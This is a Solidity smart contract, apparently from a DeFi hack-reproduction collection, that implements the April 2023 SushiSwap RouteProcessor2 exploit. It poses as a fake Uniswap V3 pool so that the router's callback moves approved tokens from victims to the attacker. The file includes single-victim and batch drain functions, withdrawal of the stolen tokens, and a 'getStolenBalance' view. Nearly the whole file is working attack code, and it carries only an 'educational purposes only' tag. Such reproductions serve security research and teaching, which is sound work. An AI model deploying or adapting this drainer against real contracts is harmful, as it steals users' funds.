// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "../common/IERC20.sol";
import {IRouteProcessor2} from "./interfaces/IRouteProcessor2.sol";

/**
 * @title SushiAttacker
 * @author DeFi Hack Labs
 * @notice Malicious contract that exploits RouteProcessor2 vulnerability by impersonating a Uniswap V3 pool
 * @dev This contract demonstrates the attack vector used in the April 2023 SushiSwap exploit.
 *      It combines fake pool implementation with exploit logic in a single contract.
 * @custom:security This contract is for educational purposes only. Do not use maliciously.
 */
contract SushiAttacker {
    /// ============ Immutable Storage ============
    /// @notice Owner of the attacker contract
    address public immutable owner;

    /// @notice The vulnerable RouteProcessor2 router contract
    IRouteProcessor2 public immutable router;

    /// ============ Mutable Storage ============

    /// @dev Amount of tokens to drain (set during exploit execution)
    int256 private tokenAmount;

    /// @dev Token address to exploit (set during exploit execution)
    address private token;

    /// @dev Victim address to drain from (set during exploit execution)
    address private victim;

    /// @dev Pre-built malicious route payload encoding this contract as a fake pool
    bytes private payload;

    /// @dev Placeholder token address used in route encoding (USDC)
    address private constant PLACEHOLDER_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    /// ============ Constructor ============

    /**
     * @notice Deploys the attacker contract
     * @param _router Address of the vulnerable RouteProcessor2 contract
     * @dev Pre-builds the malicious route payload that encodes this contract as a fake Uniswap V3 pool
     */
    constructor(address _router) {
        owner = msg.sender;
        router = IRouteProcessor2(_router);

        // Pre-build payload: encodes this contract as fake UniV3 pool
        // Route structure: command(1) + token(20) + numPools(1) + share(2) + poolType(1) + pool(20) + zeroForOne(1) + recipient(20)
        payload = abi.encodePacked(
            uint8(1), // Command: UniswapV3 swap
            PLACEHOLDER_TOKEN, // Placeholder token (not used in actual exploit)
            uint8(1), // Num pools
            uint16(0), // Share
            uint8(1), // Pool type (UniV3)
            address(this), // Pool address = THIS CONTRACT (the fake pool)
            false, // zeroForOne
            address(0) // Recipient
        );
    }

    /// ============ Exploit Functions ============

    /**
     * @notice Executes the exploit against a victim who has approved the router
     * @param _token Address of the ERC20 token to drain
     * @param _victim Address of the victim to drain tokens from
     * @dev This function:
     *      1. Auto-detects the victim's token balance and approval amount
     *      2. Sets up exploit parameters for the callback
     *      3. Calls router.processRoute() with malicious payload
     *      4. Router calls this contract's swap() function
     *      5. swap() calls back to router's vulnerable callback
     *      6. Callback executes transferFrom(victim, attacker, amount)
     * @custom:security Only callable by owner. For educational purposes only.
     */
    function exploit(address _token, address _victim) external {
        require(msg.sender == owner, "Not owner");

        // Auto-detect victim's balance
        uint256 balance = IERC20(_token).balanceOf(_victim);

        // Auto-detect approval amount
        uint256 approved = IERC20(_token).allowance(_victim, address(router));

        // Drain minimum of balance and approved amount
        uint256 drainAmount = balance <= approved ? balance : approved;

        // Store exploit params for callback
        tokenAmount = int256(drainAmount);
        token = _token;
        victim = _victim;

        // Call router with malicious payload
        // Router will extract pool address from route and call our swap() function
        router.processRoute(
            token, // tokenIn
            0, // amountIn=0 (no-op swap)
            token, // tokenOut
            0, // amountOut
            address(this), // to (recipient)
            payload // Malicious route encoding this contract as pool
        );
    }

    /**
     * @notice Batch exploit multiple victims in a single transaction
     * @param _token Address of the ERC20 token to drain
     * @param _victims Array of victim addresses to exploit
     * @dev Iterates through victims and exploits each one that has balance and approval
     * @custom:security Only callable by owner. For educational purposes only.
     */
    function batchExploit(address _token, address[] calldata _victims) external {
        require(msg.sender == owner, "Not owner");

        for (uint256 i = 0; i < _victims.length; i++) {
            // Auto-detect victim's balance
            uint256 balance = IERC20(_token).balanceOf(_victims[i]);

            // Auto-detect approval amount
            uint256 approved = IERC20(_token).allowance(_victims[i], address(router));

            // Drain minimum of balance and approved amount
            uint256 drainAmount = balance <= approved ? balance : approved;

            if (drainAmount > 0) {
                tokenAmount = int256(drainAmount);
                token = _token;
                victim = _victims[i];

                router.processRoute(token, 0, token, 0, address(this), payload);
            }
        }
    }

    /// ============ Fake Pool Callbacks ============

    /**
     * @notice Fake UniswapV3 pool swap function
     * @dev Implements the IUniswapV3Pool.swap() interface
     *      Called by router during processRoute() - router thinks this is a real pool
     * @param recipient Address to receive the swap output (unused)
     * @param zeroForOne Direction of swap (unused)
     * @param amountSpecified Amount to swap (unused)
     * @param sqrtPriceLimitX96 Price limit (unused)
     * @param data Additional data (unused)
     * @return amount0 Amount of token0 swapped (returns tokenAmount)
     * @return amount1 Amount of token1 swapped (returns 0)
     * @custom:security This function exploits the vulnerable router callback
     */
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        // Call back to router's vulnerable callback
        // Router will execute: token.transferFrom(victim, this, tokenAmount)
        router.uniswapV3SwapCallback(
            tokenAmount, // amount0Delta (what router will transfer from victim)
            0, // amount1Delta
            abi.encode(token, victim) // Data: which token + who to drain
        );

        return (tokenAmount, 0);
    }

    /**
     * @notice Fake UniswapV3 pool token0() function
     * @dev Implements IUniswapV3Pool interface for pool validation
     *      Returns arbitrary address that won't match any real pool in factory
     * @return Arbitrary token0 address
     */
    function token0() external pure returns (address) {
        return address(0x1111111111111111111111111111111111111111);
    }

    /**
     * @notice Fake UniswapV3 pool token1() function
     * @dev Implements IUniswapV3Pool interface for pool validation
     *      Returns arbitrary address that won't match any real pool in factory
     * @return Arbitrary token1 address
     */
    function token1() external pure returns (address) {
        return address(0x2222222222222222222222222222222222222222);
    }

    /**
     * @notice Fake UniswapV3 pool fee() function
     * @dev Implements IUniswapV3Pool interface for pool validation
     *      Returns arbitrary fee tier that won't match any real pool in factory
     * @return Arbitrary fee tier (3000 = 0.3%)
     */
    function fee() external pure returns (uint24) {
        return 3000;
    }

    /// ============ Withdrawal Functions ============

    /**
     * @notice Withdraws stolen tokens to the owner
     * @param _token Address of the ERC20 token to withdraw
     * @dev Transfers all balance of the specified token to the owner
     * @custom:security Only callable by owner
     */
    function withdraw(address _token) external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(owner, balance);
    }

    /**
     * @notice Approves owner to spend tokens (alternative withdrawal method)
     * @param _token Address of the ERC20 token to approve
     * @param _amount Amount to approve
     * @custom:security Only callable by owner
     */
    function approve(address _token, uint256 _amount) external {
        require(msg.sender == owner, "Not owner");
        IERC20(_token).approve(owner, _amount);
    }

    /// ============ View Functions ============

    /**
     * @notice Gets the balance of stolen tokens for a specific token
     * @param _token Address of the ERC20 token to check
     * @return Balance of the token in this contract
     */
    function getStolenBalance(address _token) external view returns (uint256) {
        return IERC20(_token).balanceOf(address(this));
    }
}
